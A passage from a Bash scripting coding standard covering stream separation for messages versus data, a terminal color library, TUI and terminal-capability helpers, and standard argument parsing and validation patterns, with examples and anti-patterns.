$ ./script.sh -v alice
script.sh: ◉ Looking up user: alice
script.sh: ✓ Found user: alice
User Report
===========

Username: alice
Home: /home/alice
Shell: /bin/bash

Disk Usage:
/dev/sda1  100G  50G  50G  50% /home
script.sh: ◉ Report generation complete

# Pipe output (only stdout data piped, stderr messages visible)
$ ./script.sh -v alice | grep Shell
script.sh: ◉ Looking up user: alice
script.sh: ✓ Found user: alice
Shell: /bin/bash
script.sh: ◉ Report generation complete

# Redirect output (data to file, messages to terminal)
$ ./script.sh -v alice > report.txt
script.sh: ◉ Looking up user: alice
script.sh: ✓ Found user: alice
script.sh: ◉ Report generation complete

$ cat report.txt
User Report
===========
...
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - using info() for data output
get_user_email() {
  local -- email=$1
  info "$email"  # Goes to stderr! Can't be captured!
}
email=$(get_user_email alice)  # $email is empty!

# ✓ Correct - use echo for data output
get_user_email() {
  local -- email=$1
  echo "$email"  # Goes to stdout, can be captured
}
email=$(get_user_email alice)  # $email contains value

# ✗ Wrong - using echo for operational status
process_file() {
  local -- file=$1
  echo "Processing ${file@Q}..."  # Goes to stdout - mixes with data!
  cat "$file"
}

# ✓ Correct - use messaging function for status
process_file() {
  local -- file=$1
  info "Processing ${file@Q}..."  # Goes to stderr - separated from data
  cat "$file"                     # Data to stdout
}

# ✗ Wrong - help text using info()
show_help() {
  info 'Usage: script.sh [OPTIONS]'
  info '  -v  Verbose mode'
  info '  -h  Show help'
}
# Won't display if VERBOSE=0!

# ✓ Correct - help text using echo/cat
show_help() {
  cat <<HELP
Usage: script.sh [OPTIONS]
  -v  Verbose mode
  -h  Show help
HELP
}

# ✗ Wrong - mixing data and status on same stream
list_files() {
  echo 'Listing files...'  # Status to stdout
  ls                       # Data to stdout
}
# Can't parse output cleanly!

# ✓ Correct - status to stderr, data to stdout
list_files() {
  info 'Listing files...'  # Status to stderr
  ls                        # Data to stdout
}

# ✗ Wrong - error messages to stdout
validate_input() {
  if [[ ! -f "$1" ]]; then
    echo "File not found ${1@Q}"  # To stdout - wrong stream!
    return 1
  fi
}

# ✓ Correct - error messages to stderr
validate_input() {
  if [[ ! -f "$1" ]]; then
    error "File not found ${1@Q}"  # To stderr - correct stream
    return 1
  fi
}

# ✗ Wrong - data output respecting VERBOSE
get_count() {
  local -i count=10
  ((VERBOSE)) || return 0
  echo "$count"  # Data not shown if VERBOSE=0!
}

# ✓ Correct - data always outputs
get_count() {
  local -i count=10
  echo "$count"  # Always outputs data
}

# ✗ Wrong - multi-line help with info()
show_help() {
  info 'Usage: script.sh [OPTIONS]'
  info ''
  info 'Options:'
  info '  -v  Verbose'
}
# Verbose-dependent, ugly formatting

# ✓ Correct - multi-line help with echo/cat
show_help() {
  cat <<HELP
$SCRIPT_NAME $VERSION - A brief description

A longer description.

Usage: $SCRIPT_NAME [OPTIONS]

Options:
  -v  Verbose

Examples:

HELP
}
```

**Edge cases and borderline scenarios:**

**1. Version output:**

```bash
# Version is data output (always display)
show_version() {
  echo "$SCRIPT_NAME $VERSION"  # Use echo
}

# Not this:
show_version() {
  info "$SCRIPT_NAME $VERSION"  # Wrong - version won't show if VERBOSE=0
}
```

**2. Progress during data generation:**

```bash
# Need progress while generating data
generate_data() {
  local -i i

  # Progress to stderr
  info 'Generating data...'

  # Data to stdout
  for ((i=1; i<=100; i+=1)); do
    echo "line $i"
  done

  # Completion status to stderr
  success 'Data generation complete'
}

# Caller can capture data, see progress
data=$(generate_data)
```

**3. Conditional output formatting:**

```bash
# Different output for interactive vs non-interactive
show_result() {
  if [[ -t 1 ]]; then
    # Interactive terminal - use messaging functions
    success 'Operation completed'
    info "Result: $result"
  else
    # Non-interactive/piped - use plain echo
    echo "$result"
  fi
}
```

**4. Error context in functions:**

```bash
# Function can use messaging for context, return code for status
validate_config() {
  local -- config_file=$1

  if [[ ! -f "$config_file" ]]; then
    error "Config file not found ${config_file@Q}"
    return 2
  fi

  if [[ ! -r "$config_file" ]]; then
    error "Config file not readable ${config_file@Q}"
    return 5
  fi

  # Validation passed - no output needed
  return 0
}

# Caller handles based on return code
if ! validate_config "$config"; then
  die $? 'Configuration validation failed'
fi
```

**5. Logging vs user messages:**

```bash
# Log to file (echo), message to user (messaging function)
process_item() {
  local -- item=$1

  # Log entry (data to stdout, redirected to file)
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] Processing: $item"

  # User message (status to stderr)
  info "Processing $item..."
}

# Usage with logging
process_item "$item" >> "$log_file"
```

**Testing stream separation:**

```bash
# Test that data goes to stdout
test_data_output() {
  local -- output

  output=$(get_user_home alice)

  [[ -n "$output" ]] || die 1 'Expected output from get_user_home'
  info 'Test passed: Data captured correctly'
}

# Test that messages don't interfere with data capture
test_message_separation() {
  local -- output

  # Capture stdout only
  output=$(
    info 'Starting process...'  # To stderr - not captured
    echo 'data'                  # To stdout - captured
    success 'Process complete'   # To stderr - not captured
  )

  [[ "$output" == 'data' ]] || die 1 "Expected 'data', got ${output@Q}"
  info 'Test passed: Messages separate from data'
}
```

**Summary:**

- **Use messaging functions** for operational status, diagnostics, and user-facing messages
- **Use plain `echo`** for data output, help text, structured reports, and parseable output
- **Stream separation**: Messaging to stderr (user-facing), echo to stdout (data/parseable)
- **Verbosity**: Messaging functions respect `VERBOSE`, echo always displays
- **Pipeability**: Only stdout (echo) should contain data for piping/capturing
- **Multi-line output**: Use echo with here-docs, not multiple messaging function calls
- **Error messages**: Always to stderr (use `error()` or `>&2 echo`)
- **Help/version**: Always display (echo), never verbose-dependent

**Key principle:** The choice between echo and messaging functions is fundamentally about stream separation. Operational messages (how the script is working) belong on stderr via messaging functions. Data output (what the script produces) belongs on stdout via echo. This separation enables proper script composition, piping, and redirection while keeping users informed of progress.


---


**Rule: BCS0706**

## Color Management Library

For scripts requiring more sophisticated color management than inline declarations (BCS0701), use a dedicated color management library that provides a two-tier system, automatic terminal detection, and integration with the BCS \_msg system (BCS0703).

**Rationale:**

- **Namespace Control**: Two-tier system (basic vs complete) prevents pollution of the global namespace
- **Flexibility**: Auto-detection, force-on, or force-off modes for different deployment scenarios
- **_msg Integration**: `flags` option sets standard BCS control variables (VERBOSE, DEBUG, DRY_RUN, PROMPT)
- **Reusability**: Dual-purpose pattern (BCS010201) allows sourcing as library or executing for demonstration
- **Maintainability**: Centralized color definitions rather than scattered inline declarations
- **Testing**: Built-in verbose mode for debugging color variable states

**Two-Tier Color System:**

**Basic tier (5 variables)** - Default, minimal namespace pollution:
```bash
NC          # No Color / Reset
RED         # Error messages
GREEN       # Success messages
YELLOW      # Warnings
CYAN        # Information
```

**Complete tier (12 variables)** - Opt-in, full ANSI capability:
```bash
# Basic tier (above) plus:
BLUE        # Additional color option
MAGENTA     # Additional color option
BOLD        # Text emphasis
ITALIC      # Text styling
UNDERLINE   # Text emphasis
DIM         # De-emphasized text
REVERSE     # Inverted colors
```

**Library Function Signature:**

```bash
color_set [OPTIONS...]
```

**Options (combinable in any order):**

| Option | Description |
|--------|-------------|
| `basic` | Enable basic 5-variable set (default) |
| `complete` | Enable complete 12-variable set |
| `auto` | Auto-detect terminal (checks stdout AND stderr) (default) |
| `always` | Force colors on (even when piped/redirected) |
| `never`, `none` | Force colors off |
| `verbose`, `-v`, `--verbose` | Print all variable declarations |
| `flags` | Set BCS \_msg globals: VERBOSE, DEBUG, DRY_RUN, PROMPT |
| `--help`, `-h`, `help` | Display usage (executable mode only) |

**BCS _msg System Integration:**

The `flags` option initializes standard BCS control variables used by core message functions (BCS0703):

```bash
source color-set
color_set complete flags

# Now these globals are set:
# VERBOSE=1 (or preserved if already set)
# DEBUG=0
# DRY_RUN=1
# PROMPT=1
```

This integration enables one-line initialization of both colors and messaging control:
```bash
#!/bin/bash
source /usr/local/lib/color-set
color_set complete flags

# Colors and _msg system now ready
info 'Starting process'
success 'Operation completed'
```

**Dual-Purpose Pattern (BCS010201):**

The library implements the dual-purpose pattern, working both as a sourceable library and standalone utility:

```bash
# Usage 1: Source as library (traditional)
source color-set
color_set complete
echo "${RED}Error:${NC} Failed"

# Usage 2: Source as library (enhanced - auto-calls color_set)
source color-set complete
echo "${RED}Error:${NC} Failed"

# Usage 3: Execute for demonstration
./color-set complete verbose
./color-set --help
```

The enhanced sourcing syntax passes arguments directly to `color_set`, eliminating the need for a separate function call.

**Implementation Example:**

```bash
#!/bin/bash
#shellcheck disable=SC2015
# color-set - Color management library

color_set() {
  local -i color=-1 complete=0 verbose=0 flags=0
  while (($#)); do
    case ${1:-auto} in
      complete) complete=1 ;;
      basic)    complete=0 ;;
      flags)    flags=1 ;;
      verbose|-v|--verbose)
                verbose=1 ;;
      always)   color=1 ;;
      never|none)
                color=0 ;;
      auto)     color=-1 ;;
      *)        >&2 echo "${FUNCNAME[0]}: ✗ Invalid argument ${1@Q}"
                return 2 ;;
    esac
    shift
  done

  # Auto-detect: both stdout AND stderr must be TTY
  ((color == -1)) && { [[ -t 1 && -t 2 ]] && color=1 || color=0; } ||:

  # Set BCS control flags if requested
  if ((flags)); then
    declare -igx VERBOSE=${VERBOSE:-1}
    ((complete)) && declare -igx DEBUG=0 DRY_RUN=1 PROMPT=1 || :
  fi

  # Declare color variables
  if ((color)); then
    declare -gx NC=$'\033[0m' RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m'
    ((complete)) && declare -gx BLUE=$'\033[0;34m' MAGENTA=$'\033[0;35m' BOLD=$'\033[1m' ITALIC=$'\033[3m' UNDERLINE=$'\033[4m' DIM=$'\033[2m' REVERSE=$'\033[7m' || :
  else
    declare -gx NC='' RED='' GREEN='' YELLOW='' CYAN=''
    ((complete)) && declare -gx BLUE='' MAGENTA='' BOLD='' ITALIC='' UNDERLINE='' DIM='' REVERSE='' || :
  fi

  # Verbose output if requested
  if ((verbose)); then
    ((flags)) && declare -p VERBOSE ||:
    declare -p NC RED GREEN YELLOW CYAN
    ((complete)) && {
      ((flags)) && declare -p DEBUG DRY_RUN PROMPT ||:
      declare -p BLUE MAGENTA BOLD ITALIC UNDERLINE DIM REVERSE
    } ||:
  fi

  return 0
}
declare -fx color_set

# Dual-purpose pattern: enhanced syntax support
[[ ${BASH_SOURCE[0]} == "$0" ]] || {
  (($#)) && color_set "$@" || :
  return 0
}

# Executable section (only runs when executed directly)
#!/bin/bash #semantic
set -euo pipefail

declare -r VERSION=1.0.1

# Help handling
if [[ ${1:-} =~ ^(-h|--help|help)$ ]]; then
  cat <<HELP
color-set $VERSION [OPTIONS...]

Dual-purpose bash library for terminal color management with ANSI escape codes.

MODES:
  Source as library:  source color-set; color_set [OPTIONS]
  Execute directly:   color-set [OPTIONS]

OPTIONS:
  complete          Enable complete color set (12 variables)
  basic             Enable basic color set (5 variables) [default]

  always            Force colors on
  never, none       Force colors off
  auto              Auto-detect TTY [default]

  verbose, -v       Print variable declarations
  --verbose

  flags             Set standard BCS globals for _msg system messaging constructs
                    • With 'basic': Sets VERBOSE only
                    • With 'complete': Sets VERBOSE, DEBUG, DRY_RUN, PROMPT

BASIC TIER (5 variables):
  NC, RED, GREEN, YELLOW, CYAN

COMPLETE TIER (+7 additional variables):
  BLUE, MAGENTA, BOLD, ITALIC, UNDERLINE, DIM, REVERSE

EXAMPLES:
  color-set complete verbose
  color-set always
  source color-set && color_set complete && echo "\${RED}Error\${NC}"

OPTIONS can be combined in any order.
HELP
  exit 0
fi

color_set "$@"

#fin
```

**Usage Examples:**

**Basic usage:**
```bash
#!/bin/bash
source color-set
color_set basic

echo "${RED}Error:${NC} Operation failed"
echo "${GREEN}Success:${NC} Operation completed"
echo "${YELLOW}Warning:${NC} Deprecated feature"
```

**Complete tier with attributes:**
```bash
source color-set
color_set complete

echo "${BOLD}${RED}CRITICAL ERROR${NC}"
echo "${ITALIC}${CYAN}Note:${NC} ${DIM}Additional details${NC}"
echo "${UNDERLINE}Important${NC}"
```

**Force colors for piped output:**
```bash
#!/bin/bash
source color-set
color_set complete always

# Colors preserved even when piped
./script.sh | less -R
```

**Disable colors for logging:**
```bash
#!/bin/bash
source color-set
color_set never

# No ANSI codes in log files
exec > /var/log/script.log 2>&1
```

**Integrated with BCS _msg system:**
```bash
#!/bin/bash
# Enhanced syntax: source and configure in one line
source color-set complete flags

# Now have colors AND messaging functions
info "Starting process"        # Uses CYAN, respects VERBOSE
success "Build completed"      # Uses GREEN, respects VERBOSE
error "Connection failed"      # Uses RED, always shown
debug "State: x=$x"            # Uses YELLOW, respects DEBUG
```

**Testing color variables:**
```bash
# Show all variables in current shell
source color-set
color_set complete verbose

# Test as executable
./color-set complete verbose

# Test piped output (should disable colors)
./color-set auto verbose | cat
```

**Anti-patterns:**

❌ **Scattered inline color declarations:**
```bash
# DON'T: Duplicate declarations across scripts
RED=$'\033[0;31m'
GREEN=$'\033[0;32m'
# ... repeated in every script
```

❌ **Always loading complete tier:**
```bash
# DON'T: Pollute namespace when only need basic colors
source color-set
color_set complete  # Unnecessary if only using RED/GREEN/YELLOW/CYAN
```

❌ **Testing only stdout:**
```bash
# DON'T: Incomplete terminal detection
[[ -t 1 ]] && color=1  # Fails when stderr redirected
# DO: Test both streams
[[ -t 1 && -t 2 ]] && color=1 || color=0
```

❌ **Forcing colors without user control:**
```bash
# DON'T: Hardcode color mode
color_set always
# DO: Respect environment or provide flag
color_set ${COLOR_MODE:-auto}
```

**Reference Implementation:**

See `/usr/local/lib/color-set` or https://github.com/Open-Technology-Foundation/color-set

**Cross-References:**

- **BCS0701** (Standardized Messaging and Color Support) - Basic inline color pattern that this enhances
- **BCS0703** (Core Message Functions) - _msg system that uses these colors and control flags
- **BCS010201** (Dual-Purpose Scripts) - Pattern this library implements

**Ref:** BCS0706


---


**Rule: BCS0707**

### TUI Basics

**Rule: BCS0907**

Creating text-based user interface elements in terminal scripts.

---

#### Rationale

TUI elements provide:
- Visual feedback for long-running operations
- Interactive prompts and menus
- Progress indication
- Better user experience

---

#### Progress Indicators

```bash
# Simple spinner
spinner() {
  local -a frames=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
  local -i i=0
  while ((1)); do
    printf '\r%s %s' "${frames[i % ${#frames[@]}]}" "$*"
    i+=1
    sleep 0.1
  done
}

# Start spinner in background
spinner 'Processing...' &
spinner_pid=$!

# Do work...
long_operation

# Stop spinner
kill "$spinner_pid" 2>/dev/null
printf '\r\033[K'  # Clear line
```

#### Progress Bar

```bash
progress_bar() {
  local -i current=$1 total=$2 width=${3:-50}
  local -i filled=$((current * width / total))
  local -i empty=$((width - filled))
  local -- bar

  bar=$(printf '%*s' "$filled" '' | tr ' ' '█')
  bar+=$(printf '%*s' "$empty" '' | tr ' ' '░')

  printf '\r[%s] %3d%%' "$bar" $((current * 100 / total))
}

# Usage
declare -i i
for ((i=1; i<=100; i+=1)); do
  progress_bar "$i" 100
  sleep 0.05
done
echo
```

#### Cursor Control

```bash
# Hide/show cursor
hide_cursor() { printf '\033[?25l'; }
show_cursor() { printf '\033[?25h'; }
trap 'show_cursor' EXIT

# Move cursor
move_up() { printf '\033[%dA' "${1:-1}"; }
move_down() { printf '\033[%dB' "${1:-1}"; }
move_to() { printf '\033[%d;%dH' "$1" "$2"; }

# Clear operations
clear_line() { printf '\033[2K\r'; }
clear_screen() { printf '\033[2J\033[H'; }
clear_to_end() { printf '\033[J'; }
```

#### Interactive Menu

```bash
select_option() {
  local -a options=("$@")
  local -i selected=0
  local -- key

  hide_cursor
  trap 'show_cursor' RETURN

  while ((1)); do
    # Display menu
    local -i i
    for ((i=0; i<${#options[@]}; i+=1)); do
      if ((i == selected)); then
        printf '  \033[7m %s \033[0m\n' "${options[i]}"
      else
        printf '   %s\n' "${options[i]}"
      fi
    done

    # Read keypress
    IFS= read -rsn1 key
    case $key in
      $'\x1b')  # Escape sequence
        read -rsn2 key
        case "$key" in
          '[A') ((selected > 0)) && ((selected-=1)) ;;  # Up
          '[B') ((selected < ${#options[@]}-1)) && ((selected+=1)) ;;  # Down
        esac
        ;;
      '') break ;;  # Enter
    esac

    # Move cursor back up
    printf '\033[%dA' "${#options[@]}"
  done

  show_cursor
  return "$selected"
}

# Usage
select_option 'Option 1' 'Option 2' 'Option 3'
selected=$?
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - TUI without terminal check
progress_bar 50 100  # Garbage if not a terminal

# ✓ Correct - check for terminal
if [[ -t 1 ]]; then
  progress_bar 50 100
else
  echo '50% complete'
fi
```

---

**See Also:** BCS0908 (Terminal Capabilities), BCS0701 (Color Support)


---


**Rule: BCS0708**

### Terminal Capabilities

**Rule: BCS0908**

Detecting and utilizing terminal features safely.

---

#### Rationale

Terminal capability detection:
- Ensures scripts work in all environments
- Provides graceful fallbacks for limited terminals
- Enables rich output when available
- Prevents garbage output in non-terminal contexts

---

#### Terminal Detection

```bash
declare -i USE_COLORS
# Check if stdout is a terminal
if [[ -t 1 ]]; then
  # Terminal - can use colors, cursor control
  USE_COLORS=1
else
  # Pipe or redirect - plain output only
  USE_COLORS=0
fi

# Check both stdout and stderr
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' NC=$'\033[0m'
else
  declare -r RED='' NC=''
fi
```

#### Terminal Size

```bash
# Get terminal dimensions
get_terminal_size() {
  if [[ -t 1 ]]; then
    TERM_COLS=$(tput cols 2>/dev/null || echo 80)
    TERM_ROWS=$(tput lines 2>/dev/null || echo 24)
  else
    TERM_COLS=80
    TERM_ROWS=24
  fi
}

# Auto-update on resize
trap 'get_terminal_size' WINCH
get_terminal_size
```

#### Capability Checking

```bash
# Check for specific capability
has_capability() {
  local -- cap=$1
  tput "$cap" &>/dev/null
}

# Use with fallback
if has_capability colors; then
  num_colors=$(tput colors)
  ((num_colors >= 256)) && USE_256_COLORS=1 ||:
fi

# Check for Unicode support
has_unicode() {
  [[ "${LC_ALL:-${LC_CTYPE:-${LANG:-}}}" == *UTF-8* ]]
}
```

#### Safe Output Functions

```bash
# Width-aware output
print_line() {
  local -i width=${TERM_COLS:-80}
  printf '%*s\n' "$width" '' | tr ' ' '─'
}

# Truncate to terminal width
truncate_string() {
  local -- str=$1
  local -i max=${2:-$TERM_COLS}

  if ((${#str} > max)); then
    echo "${str:0:$((max-3))}..."
  else
    echo "$str"
  fi
}

# Center text
center_text() {
  local -- text=$1
  local -i width=${TERM_COLS:-80}
  local -i padding=$(((width - ${#text}) / 2))

  printf '%*s%s\n' "$padding" '' "$text"
}
```

#### ANSI Code Reference

```bash
# Common ANSI escape codes
declare -r ESC=$'\033'

# Colors (foreground)
declare -r BLACK="${ESC}[30m"  RED="${ESC}[31m"
declare -r GREEN="${ESC}[32m"  YELLOW="${ESC}[33m"
declare -r BLUE="${ESC}[34m"   MAGENTA="${ESC}[35m"
declare -r CYAN="${ESC}[36m"   WHITE="${ESC}[37m"

# Styles
declare -r BOLD="${ESC}[1m"    DIM="${ESC}[2m"
declare -r ITALIC="${ESC}[3m"  UNDERLINE="${ESC}[4m"
declare -r BLINK="${ESC}[5m"   REVERSE="${ESC}[7m"

# Reset
declare -r NC="${ESC}[0m"
declare -n RESET=NC

# Cursor
declare -r HIDE_CURSOR="${ESC}[?25l"
declare -r SHOW_CURSOR="${ESC}[?25h"
declare -r SAVE_CURSOR="${ESC}7"
declare -r RESTORE_CURSOR="${ESC}8"
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - assuming terminal support
echo -e '\033[31mError\033[0m'  # May output garbage

# ✓ Correct - conditional output
if [[ -t 1 ]]; then
  echo -e '\033[31mError\033[0m'
else
  echo 'Error'
fi
```

```bash
# ✗ Wrong - hardcoded width
printf '%-80s\n' "$text"  # May wrap or truncate wrong

# ✓ Correct - use terminal width
printf '%-*s\n' "${TERM_COLS:-80}" "$text"
```

---

**See Also:** BCS0907 (TUI Basics), BCS0906 (Color Management)


---


**Rule: BCS0800**

# Command-Line Arguments

This section establishes the standard argument parsing pattern that supports both short options (`-h`, `-v`) and long options (`--help`, `--version`), ensuring consistent command-line interfaces across all scripts. It defines the canonical version output format (`scriptname X.Y.Z`), explains validation patterns for checking required arguments and detecting option conflicts, and provides guidance on where to place argument parsing logic (main function vs top-level) based on script complexity. These patterns make scripts predictable, user-friendly, and maintainable while supporting both interactive and automated usage.


---


**Rule: BCS0801**

## Standard Argument Parsing Pattern

**Complete pattern with short option support:**

```bash
while (($#)); do case $1 in
  -a|--add)       noarg "$@"; shift
                  process_argument "$1" ;;
  -m|--depth)     noarg "$@"; shift
                  max_depth=$1 ;;
  -L|--follow-symbolic)
                  symbolic='-L' ;;

  -p|--prompt)    PROMPT=1; ((VERBOSE)) || VERBOSE=1 ;;
  -v|--verbose)   VERBOSE+=1 ;;
  -q|--quiet)     VERBOSE=0 ;;

  -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
  -h|--help)      show_help; exit 0 ;;

  -[amLpvqVh]*) #shellcheck disable=SC2046 #split up single options
                  set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}" ;;
  -*)             die 22 "Invalid option ${1@Q}" ;;
  *)              Paths+=("$1") ;;
esac; shift; done
```

**Pattern breakdown and rationale:**

**1. Loop structure: `while (($#)); do ... done`**
- `(($#))` - Arithmetic test, true while arguments remain
- More efficient than `while [[ $# -gt 0 ]]`
- Exits when no arguments left

**2. Case statement: `case $1 in ... esac`**
- Matches current argument (`$1`) against patterns
- Supports multiple patterns per branch: `-a|--add`
- More readable than nested if/elif chains

**3. Options with arguments:**
```bash
-m|--depth)     noarg "$@"; shift
                max_depth=$1 ;;
```
- `noarg "$@"` - Validates argument exists (prevents "missing argument" errors)
- `shift` - Moves to next argument (the value)
- `max_depth="$1"` - Captures the value
- Second `shift` at end of loop moves past the value

**4. Options without arguments (flags):**
```bash
-p|--prompt)    PROMPT=1; ((VERBOSE)) || VERBOSE=1 ;;
-v|--verbose)   VERBOSE+=1 ;;
```
- Just set variables, no shift needed (handled at loop end)
- Can set multiple variables per option
- `VERBOSE+=1` allows stacking: `-vvv` = `VERBOSE=3`

**5. Options that exit immediately:**
```bash
-V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
-h|--help)      show_help; exit 0 ;;
```
- Print information and exit
- No shift needed (script exits)
- Use `exit 0` (success exit code)
- If within a function, use `return 0`

**6. Short option bundling:**
In command argument processing loops, short option splitting should *always* be included.

```bash
-[VhamLpvq]*) #shellcheck disable=SC2046 #split up single options
              set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}" ;;
```
- **Purpose**: Allows `-vpL` instead of `-v -p -L`
- **Pattern**: `-[amLpvqVh]*` matches any short option combination
- **Mechanism**: Splits bundled options into separate arguments
- **Example**: `-vpL file` becomes `-v -p -L file`
- **How it works:**
  1. `${1:1}` - Remove leading dash (e.g., `-vpL` → `vpL`)
  2. `grep -o .` - Split into individual characters
  3. `printf -- "-%c "` - Add dash before each character
  4. `set --` - Replace argument list with expanded options

**7. Invalid option handling:**
```bash
-*)             die 22 "Invalid option ${1@Q}" ;;
```
- Catches any unrecognized option starting with `-`
- Uses exit code 22 (EINVAL - invalid argument)
- Shows which option was invalid

**8. Positional arguments:**
```bash
*)              Paths+=("$1") ;;
```
- Default case: Not an option, must be positional argument
- Append to array for later processing
- Allows unlimited positional arguments

**9. Mandatory shift at end:**
```bash
esac; shift; done
```
- `shift` after every iteration moves to next argument
- Critical: Without this, infinite loop!
- Placed after `esac` to handle all branches uniformly

**The `noarg` helper function:**

```bash
noarg() { (($# > 1)) || die 2 "Option ${1@Q} requires an argument"; }
```

- **Purpose**: Validates that option requiring an argument has one
- **Check**: `(($# > 1))` - At least 2 args (option + value)
- **Usage**: Always call before shifting to capture argument value
- **Example**: `./script -m` (missing value) → "Option '-m' requires an argument"

**Complete example with all features:**

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Default values
declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -- output_file=''
declare -a files=()

# ============================================================================
# Utility Functions
# ============================================================================

error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
noarg() { (($# > 1)) || die 2 "Option ${1@Q} requires an argument"; }

show_help() {
  cat <<HELP
$SCRIPT_NAME $VERSION - Process files

Process files with various options.

Usage: $SCRIPT_NAME [OPTIONS] FILE...

Options:
  -o, --output FILE  Output file (required)
  -v, --verbose      Verbose output
  -n, --dry-run      Dry-run mode
  -V, --version      Show version
  -h, --help         Show this help

Examples:
  $SCRIPT_NAME -o output.txt file1.txt file2.txt
  $SCRIPT_NAME -vno result.txt *.txt
HELP
}

# ============================================================================
# Main Function
# ============================================================================

main() {
  # Parse arguments
  while (($#)); do case $1 in
    -o|--output)    noarg "$@"; shift
                    output_file=$1 ;;
    -v|--verbose)   VERBOSE+=1 ;;
    -n|--dry-run)   DRY_RUN=1 ;;
    -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
    -h|--help)      show_help; exit 0 ;;

    # Short option bundling support
    -[ovnVh]*)    #shellcheck disable=SC2046
                    set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}" ;;
    -*)             die 22 "Invalid option ${1@Q}" ;;
    *)              files+=("$1") ;;
  esac; shift; done

  # Make variables readonly after parsing
  readonly -- VERBOSE DRY_RUN output_file
  readonly -a files

  # Validate required arguments
  ((${#files[@]} > 0)) || die 2 'No input files specified'
  [[ -n "$output_file" ]] || die 2 'Output file required (use -o)'

  # Use parsed arguments
  ((VERBOSE)) && echo "Processing ${#files[@]} files" ||:
  ((DRY_RUN)) && echo '[DRY RUN] Would write to:' "$output_file" ||:

  # Process files (example logic)
  local -- file
  for file in "${files[@]}"; do
    ((VERBOSE)) && echo "Processing ${file@Q}" ||:
    # Processing logic here
  done

  ((VERBOSE)) && echo "Would write results to ${output_file@Q}" ||:
}

main "$@"
#fin
```

**Short option bundling examples:**

```bash
# These are equivalent:
./script -v -n -o output.txt file.txt
./script -vno output.txt file.txt

# These are equivalent:
./script -v -v -v file.txt
./script -vvv file.txt

# Mixed long and short:
./script --verbose -no output.txt --dry-run file.txt
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - using while [[ ]] instead of (())
while [[ $# -gt 0 ]]; do  # Verbose, less efficient

# ✓ Correct
while (($#)); do

# ✗ Wrong - not calling noarg before shift
-o|--output)    shift
                output_file=$1 ;;  # Fails if no argument!

# ✓ Correct
-o|--output)    noarg "$@"; shift
                output_file=$1 ;;

# ✗ Wrong - forgetting shift at loop end
while (($#)); do case $1 in
  ...
esac; done  # Infinite loop!

# ✓ Correct
while (($#)); do case $1 in
  ...
esac; shift; done

# ✗ Wrong - using if/elif chains instead of case
if [[ "$1" == '-v' ]] || [[ "$1" == '--verbose' ]]; then
  VERBOSE+=1
elif [[ "$1" == '-h' ]] || [[ "$1" == '--help' ]]; then
  show_help
  ...
fi

# ✓ Correct - use case statement
case $1 in
  -v|--verbose) VERBOSE+=1 ;;
  -h|--help)    show_help; exit 0 ;;
  ...
esac
```

**Rationale for this pattern:**

1. **Consistent**: Same structure works for all scripts
2. **Flexible**: Handles options with/without arguments, bundled shorts
3. **Safe**: Validates arguments exist before using them
4. **Readable**: Case statement is more scannable than if/elif chains
5. **Efficient**: Arithmetic test `(($#))` faster than `[[ ]]`
6. **Standard**: Follows Unix conventions (short/long options, bundling)


---


**Rule: BCS0802**

## Version Output Format

**Standard format:** `<script_name> <version_number>`

The `-V`/`--version` option should output the script name followed by a space and the version number. Do **not** include the words "version", "vs", or "v" between them.

```bash
# ✓ Correct
-V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
# Output: myscript 1.2.3

# ✗ Wrong - do not include the word "version"
-V|--version)   echo "$SCRIPT_NAME version $VERSION"; exit 0 ;;
# Output: myscript version 1.2.3  (incorrect)
```

**Rationale:** This format follows GNU standards and is consistent with most Unix/Linux utilities (e.g., `bash --version` outputs "GNU bash, version 5.2.15", not "GNU bash version version 5.2.15").


---


**Rule: BCS0803**

## Argument Validation

**Use validation helpers to ensure option arguments exist and are valid types before processing.**

**Rationale:** Prevents silent failures, provides clear error messages, catches user mistakes (like `--output --verbose` where filename is missing), validates data types before use.

### Three Validation Patterns

**1. `noarg()` - Basic Existence Check**

Validates that an option has an argument following it.

```bash
noarg() { (($# > 1)) && [[ ${2:0:1} != '-' ]] || die 2 "Missing argument for option ${1@Q}"; }
```

**Usage:**
```bash
while (($#)); do case $1 in
  -o|--output)
    noarg "$@"      # Validate argument exists
    shift
    OUTPUT=$1       # Now safe to use $1
    ;;
esac; shift; done
```

**What it checks:**
- `(($# > 1))` - At least 2 arguments remain (option + value)
- `[[ ${2:0:1} != '-' ]]` - Next argument doesn't start with `-`

**2. `arg2()` - Enhanced Validation with Safe Quoting**

Enhanced version with better error messages using shell quoting (`${1@Q}`).

```bash
arg2() {
  if ((${#@}-1<1)) || [[ "${2:0:1}" == '-' ]]; then
    die 2 "${1@Q} requires argument"
  fi
}
```

**Usage:**
```bash
while (($#)); do case $1 in
  -p|--prefix)
    arg2 "$@"       # Enhanced validation
    shift
    PREFIX=$1
    ;;
esac; shift; done
```

**Differences from `noarg()`:**
- Uses `${#@}-1<1` for argument count (explicit remaining args)
- Uses `${1@Q}` for safe parameter quoting in error message
- More concise error message format

**Benefits:**
- **Catches:** `script --output --verbose` (no filename provided)
- **Prevents:** Using next option as value
- **Safe quoting:** `${1@Q}` escapes special characters in error output

